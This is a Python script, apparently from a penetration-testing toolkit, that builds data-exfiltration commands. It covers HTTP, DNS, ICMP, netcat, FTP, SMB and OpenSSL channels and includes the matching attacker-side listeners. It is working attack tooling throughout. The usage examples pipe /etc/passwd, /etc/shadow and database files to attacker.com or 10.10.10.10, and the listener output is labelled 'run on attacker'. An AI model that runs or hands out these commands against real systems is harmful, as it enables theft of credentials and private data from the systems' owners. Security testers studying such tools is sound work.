#!/usr/bin/env python3
"""
Data Exfiltration Helper
Generate exfiltration commands and payloads.

USAGE:
    python data_exfil.py <method> --file <path> --dest <destination>

EXAMPLES:
    python data_exfil.py dns --file /etc/passwd --dest attacker.com
    python data_exfil.py http --file /etc/shadow --dest http://10.10.10.10:8080
    python data_exfil.py icmp --file data.txt --dest 10.10.10.10
    python data_exfil.py --list  # List all methods
"""

import sys
import argparse
import base64
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner

EXFIL_METHODS = {
    'http_curl': {
        'description': 'HTTP POST with curl',
        'command': 'curl -X POST -d @{file} {dest}',
        'encoded': 'curl -X POST -d "$(cat {file} | base64)" {dest}',
    },
    'http_wget': {
        'description': 'HTTP POST with wget',
        'command': 'wget --post-file={file} {dest}',
        'encoded': 'wget --post-data="$(cat {file} | base64)" {dest}',
    },
    'http_python': {
        'description': 'HTTP with Python',
        'command': '''python3 -c "import requests; requests.post('{dest}', data=open('{file}').read())"''',
        'encoded': '''python3 -c "import requests,base64; requests.post('{dest}', data=base64.b64encode(open('{file}','rb').read()))"''',
    },
    'dns_nslookup': {
        'description': 'DNS exfiltration via nslookup',
        'command': '''for line in $(cat {file} | xxd -p -c 30); do nslookup $line.{dest}; done''',
        'encoded': '''data=$(cat {file} | base64 -w 60); for chunk in $data; do nslookup $chunk.{dest}; done''',
    },
    'dns_dig': {
        'description': 'DNS exfiltration via dig',
        'command': '''for line in $(cat {file} | xxd -p -c 30); do dig $line.{dest}; done''',
        'encoded': '''data=$(cat {file} | base64 -w 60); for chunk in $data; do dig $chunk.{dest}; sleep 0.5; done''',
    },
    'dns_host': {
        'description': 'DNS exfiltration via host',
        'command': '''for line in $(cat {file} | xxd -p -c 30); do host $line.{dest}; done''',
    },
    'icmp_ping': {
        'description': 'ICMP exfiltration via ping',
        'command': '''xxd -p -c 16 {file} | while read line; do ping -c 1 -p $line {dest}; done''',
    },
    'icmp_python': {
        'description': 'ICMP exfiltration via Python/Scapy',
        'command': '''python3 -c "from scapy.all import *; data=open('{file}','rb').read(); [send(IP(dst='{dest}')/ICMP()/data[i:i+32]) for i in range(0,len(data),32)]"''',
    },
    'nc_tcp': {
        'description': 'TCP exfiltration via netcat',
        'command': 'cat {file} | nc {dest} {port}',
        'encoded': 'cat {file} | base64 | nc {dest} {port}',
        'listener': 'nc -lvnp {port} > received_data',
    },
    'nc_udp': {
        'description': 'UDP exfiltration via netcat',
        'command': 'cat {file} | nc -u {dest} {port}',
        'listener': 'nc -ulvnp {port}',
    },
    'ftp_curl': {
        'description': 'FTP upload with curl',
        'command': 'curl -T {file} ftp://{dest}/ --user anonymous:anonymous',
    },
    'smb_smbclient': {
        'description': 'SMB upload',
        'command': 'smbclient //{dest}/share -c "put {file}"',
    },
    'base64_clipboard': {
        'description': 'Base64 encode for manual copy',
        'command': 'cat {file} | base64 | xclip -selection clipboard',
        'decode': 'echo "{data}" | base64 -d > output_file',
    },
    'xxd_hex': {
        'description': 'Hex encode for manual copy',
        'command': 'xxd -p {file}',
        'decode': 'echo "{data}" | xxd -r -p > output_file',
    },
    'python_http_server': {
        'description': 'Python HTTP server (serve files)',
        'command': 'python3 -m http.server {port}',
        'get': 'wget http://{dest}:{port}/{file}',
    },
    'php_http_server': {
        'description': 'PHP built-in server',
        'command': 'php -S 0.0.0.0:{port}',
    },
    'openssl_tcp': {
        'description': 'Encrypted exfiltration via OpenSSL',
        'command': 'cat {file} | openssl s_client -connect {dest}:{port}',
        'listener': 'openssl s_server -accept {port} -cert cert.pem -key key.pem',
    },
}

# Listener commands for receiving data
LISTENERS = {
    'http_python': '''python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('received_data', 'wb') as f:
            f.write(data)
        print('[+] Received', length, 'bytes')
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', {port}), Handler).serve_forever()
"''',
    'nc_tcp': 'nc -lvnp {port} > received_data',
    'nc_tcp_loop': 'while true; do nc -lvnp {port} > received_$(date +%s); done',
    'socat_tcp': 'socat TCP-LISTEN:{port},reuseaddr,fork OPEN:received_data,creat,append',
}


class DataExfil:
    def __init__(self):
        pass

    def generate_command(self, method: str, file: str, dest: str,
                         port: int = 8080, encoded: bool = False) -> dict:
        """Generate exfiltration command."""
        if method not in EXFIL_METHODS:
            return None

        method_info = EXFIL_METHODS[method]
        result = {'method': method, 'description': method_info['description']}

        # Select encoded or regular command
        if encoded and 'encoded' in method_info:
            cmd_template = method_info['encoded']
        else:
            cmd_template = method_info['command']

        # Format command
        result['command'] = cmd_template.format(
            file=file,
            dest=dest,
            port=port
        )

        # Add listener if available
        if 'listener' in method_info:
            result['listener'] = method_info['listener'].format(port=port)

        return result

    def generate_all(self, file: str, dest: str, port: int = 8080) -> list:
        """Generate all exfiltration commands."""
        results = []
        for method in EXFIL_METHODS:
            cmd = self.generate_command(method, file, dest, port)
            if cmd:
                results.append(cmd)
        return results

    def get_listener(self, method: str, port: int = 8080) -> str:
        """Get listener command for receiving data."""
        # Check method-specific listener
        if method in EXFIL_METHODS and 'listener' in EXFIL_METHODS[method]:
            return EXFIL_METHODS[method]['listener'].format(port=port)

        # Check generic listeners
        if method.startswith('http'):
            return LISTENERS['http_python'].format(port=port)
        elif 'nc' in method or 'tcp' in method:
            return LISTENERS['nc_tcp'].format(port=port)

        return None


def main():
    parser = argparse.ArgumentParser(
        description='Data Exfiltration Helper',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
METHODS:
    http_curl, http_wget, http_python  - HTTP-based exfiltration
    dns_nslookup, dns_dig, dns_host    - DNS-based exfiltration
    icmp_ping, icmp_python             - ICMP-based exfiltration
    nc_tcp, nc_udp                     - Netcat-based exfiltration
    ftp_curl, smb_smbclient            - File protocol exfiltration
    openssl_tcp                        - Encrypted exfiltration
    base64_clipboard, xxd_hex          - Manual copy methods

EXAMPLES:
    %(prog)s http_curl --file /etc/passwd --dest http://10.10.10.10:8080
    %(prog)s dns_nslookup --file data.txt --dest attacker.com
    %(prog)s nc_tcp --file secret.db --dest 10.10.10.10 --port 4444
    %(prog)s --all --file /etc/passwd --dest 10.10.10.10
        """
    )
    parser.add_argument('method', nargs='?', help='Exfiltration method')
    parser.add_argument('-f', '--file', help='File to exfiltrate')
    parser.add_argument('-d', '--dest', help='Destination (IP/domain)')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port (default: 8080)')
    parser.add_argument('-e', '--encoded', action='store_true', help='Use base64 encoding')
    parser.add_argument('--all', action='store_true', help='Generate all methods')
    parser.add_argument('--list', action='store_true', help='List available methods')
    parser.add_argument('--listener', action='store_true', help='Show listener command')
    args = parser.parse_args()

    banner("Data Exfiltration Helper")

    exfil = DataExfil()

    if args.list:
        info("Available exfiltration methods:\n")
        for method, details in EXFIL_METHODS.items():
            print(f"  {method:<20} - {details['description']}")
        sys.exit(0)

    if not args.file or not args.dest:
        error("Specify --file and --dest")
        parser.print_help()
        sys.exit(1)

    info(f"File: {args.file}")
    info(f"Destination: {args.dest}")

    if args.all:
        results = exfil.generate_all(args.file, args.dest, args.port)
        for r in results:
            print(f"\n[{r['method']}] {r['description']}")
            print(f"  Command: {r['command']}")
            if 'listener' in r:
                print(f"  Listener: {r['listener']}")

    elif args.method:
        result = exfil.generate_command(
            args.method, args.file, args.dest,
            args.port, args.encoded
        )

        if result:
            print(f"\n[{result['method']}] {result['description']}")
            print(f"\nExfiltration command:")
            print(f"  {result['command']}")

            if args.listener or 'listener' in result:
                listener = exfil.get_listener(args.method, args.port)
                if listener:
                    print(f"\nListener command (run on attacker):")
                    print(f"  {listener}")
        else:
            error(f"Unknown method: {args.method}")

    else:
        error("Specify a method or use --all")


if __name__ == '__main__':
    main()
